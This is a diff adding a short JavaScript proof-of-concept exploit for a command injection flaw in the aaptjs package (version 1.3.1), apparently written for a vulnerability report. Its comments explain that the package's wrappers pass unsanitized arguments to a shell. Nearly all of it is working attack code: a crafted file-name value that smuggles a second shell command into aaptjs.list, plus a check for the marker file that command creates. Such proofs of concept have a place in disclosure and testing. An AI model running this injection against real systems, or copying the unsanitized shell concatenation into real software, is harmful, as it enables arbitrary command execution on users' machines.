@@ -1,0 +1,19 @@
+```javascript
+// Exploit for aaptjs (v1.3.1) command injection.
+// All wrapper functions (list, dump, add, remove, etc.) build a shell
+// command by string-concatenating unsanitized arguments and pass it to
+// shelljs's `exec`, which runs the string through a real shell. Any
+// argument containing shell metacharacters is executed as a command.
+
+const aaptjs = require("./node_modules/aaptjs");
+const fs = require("fs");
+
+const maliciousInput = "foo.apk; touch /tmp/aaptjs_pwned #";
+
+aaptjs.list(maliciousInput, () => {
+  console.log(
+    "Command injection succeeded:",
+    fs.existsSync("/tmp/aaptjs_pwned")
+  );
+});
+```
